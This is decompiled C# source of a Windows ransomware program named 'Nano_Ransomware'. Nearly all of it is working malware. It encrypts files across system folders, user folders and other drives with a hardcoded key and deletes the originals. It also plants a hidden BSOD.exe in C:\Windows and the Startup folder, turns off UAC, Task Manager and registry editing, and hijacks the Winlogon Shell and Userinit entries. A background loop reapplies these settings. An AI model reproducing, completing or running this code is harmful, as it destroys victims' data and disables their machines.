using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Nano_Ransomware_1_;

internal class Nano_Crypt
{
	public class Encryp_main
	{
		public static void Main()
		{
			//IL_072e: Unknown result type (might be due to invalid IL or missing references)
			Process currentProcess = Process.GetCurrentProcess();
			currentProcess.PriorityClass = ProcessPriorityClass.High;
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\decrypted"))
			{
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\decrypted");
			}
			Encryp_main encryp_main = new Encryp_main();
			try
			{
				string[] files = Directory.GetFiles("C:\\");
				string[] array = files;
				foreach (string text in array)
				{
					try
					{
						encryp_main.EncryptFile(text, text + ".CRYPT");
						File.Delete(text);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				string[] files2 = Directory.GetFiles("C:\\Program Files");
				string[] array2 = files2;
				foreach (string text2 in array2)
				{
					try
					{
						encryp_main.EncryptFile(text2, text2 + ".CRYPT");
						File.Delete(text2);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				string[] files3 = Directory.GetFiles("C:\\Program Files (x86)");
				string[] array3 = files3;
				foreach (string text3 in array3)
				{
					try
					{
						encryp_main.EncryptFile(text3, text3 + ".CRYPT");
						File.Delete(text3);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				string[] files4 = Directory.GetFiles("C:\\Users");
				string[] array4 = files4;
				foreach (string text4 in array4)
				{
					try
					{
						encryp_main.EncryptFile(text4, text4 + ".CRYPT");
						File.Delete(text4);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				string[] files5 = Directory.GetFiles("C:\\Windows");
				string[] array5 = files5;
				foreach (string text5 in array5)
				{
					try
					{
						encryp_main.EncryptFile(text5, text5 + ".CRYPT");
						File.Delete(text5);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				string[] files6 = Directory.GetFiles("C:\\Windows\\System32");
				string[] array6 = files6;
				foreach (string text6 in array6)
				{
					try
					{
						encryp_main.EncryptFile(text6, text6 + ".CRYPT");
						File.Delete(text6);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				string[] files7 = Directory.GetFiles(folderPath);
				string[] array7 = files7;
				foreach (string text7 in array7)
				{
					try
					{
						encryp_main.EncryptFile(text7, text7 + ".CRYPT");
						File.Delete(text7);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
				string[] files8 = Directory.GetFiles(folderPath2);
				string[] array8 = files8;
				foreach (string text8 in array8)
				{
					try
					{
						encryp_main.EncryptFile(text8, text8 + ".CRYPT");
						File.Delete(text8);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
				string[] files9 = Directory.GetFiles(folderPath3);
				string[] array9 = files9;
				foreach (string text9 in array9)
				{
					try
					{
						encryp_main.EncryptFile(text9, text9 + ".CRYPT");
						File.Delete(text9);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
				string[] files10 = Directory.GetFiles(folderPath4);
				string[] array10 = files10;
				foreach (string text10 in array10)
				{
					try
					{
						encryp_main.EncryptFile(text10, text10 + ".CRYPT");
						File.Delete(text10);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
				string[] files11 = Directory.GetFiles(folderPath5);
				string[] array11 = files11;
				foreach (string text11 in array11)
				{
					try
					{
						encryp_main.EncryptFile(text11, text11 + ".CRYPT");
						File.Delete(text11);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
				string[] files12 = Directory.GetFiles(folderPath6);
				string[] array12 = files12;
				foreach (string text12 in array12)
				{
					try
					{
						encryp_main.EncryptFile(text12, text12 + ".CRYPT");
						File.Delete(text12);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				string folderPath7 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string[] files13 = Directory.GetFiles(folderPath7);
				string[] array13 = files13;
				foreach (string text13 in array13)
				{
					try
					{
						encryp_main.EncryptFile(text13, text13 + ".CRYPT");
						File.Delete(text13);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				string[] array14 = new string[26]
				{
					"A:\\", "B:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "CH:\\", "I:\\", "J:\\",
					"K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\",
					"U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"
				};
				string[] array15 = array14;
				foreach (string text14 in array15)
				{
					try
					{
						encryp_main.EncryptFile(text14, text14 + ".CRYPT");
						File.Delete(text14);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			string[] array16 = new string[1] { "BSOD.exe" };
			for (int num9 = 0; num9 < array16.Length; num9++)
			{
				try
				{
					Extract("Nano_Ransomware(1)", "C:\\Windows", "Resources", array16[num9]);
					File.SetAttributes("C:\\Windows\\" + array16[num9], FileAttributes.Hidden);
				}
				catch
				{
				}
			}
			try
			{
				File.Copy("C:\\Windows\\BSOD.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\BSOD.exe");
				File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\BSOD.exe", FileAttributes.Normal);
			}
			catch
			{
			}
			RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
			RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey3.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
			RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey4.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
			RegistryKey registryKey5 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey5.SetValue("Shell", "BSOD.exe", RegistryValueKind.String);
			RegistryKey registryKey6 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey6.SetValue("Userinit", "C:\\Windows\\BSOD.exe", RegistryValueKind.String);
			Thread thread = new Thread(encryp_main.looper);
			thread.Start();
			Form1 form = new Form1();
			((Form)form).ShowDialog();
		}

		public void looper()
		{
			while (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\decrypted"))
			{
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
				RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
				RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey3.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
				RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey4.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
				RegistryKey registryKey5 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
				registryKey5.SetValue("Shell", "BSOD.exe", RegistryValueKind.String);
				RegistryKey registryKey6 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
				registryKey6.SetValue("Userinit", "C:\\Windows\\BSOD.exe", RegistryValueKind.String);
				Thread.Sleep(500);
			}
		}

		public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
		{
			Assembly callingAssembly = Assembly.GetCallingAssembly();
			using Stream stream = callingAssembly.GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
			using BinaryReader binaryReader = new BinaryReader(stream);
			using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
			using BinaryWriter binaryWriter = new BinaryWriter(output);
			binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
		}

		private void EncryptFile(string inputFile, string outputFile)
		{
			try
			{
				string s = "d7a01s9u";
				UnicodeEncoding unicodeEncoding = new UnicodeEncoding();
				byte[] bytes = unicodeEncoding.GetBytes(s);
				FileStream fileStream = new FileStream(outputFile, FileMode.Create);
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write);
				FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
				int num;
				while ((num = fileStream2.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num);
				}
				fileStream2.Close();
				cryptoStream.Close();
				fileStream.Close();
			}
			catch
			{
			}
			File.Delete(inputFile);
		}
	}

	private const bool DELETE_ORIGINALS = true;
}
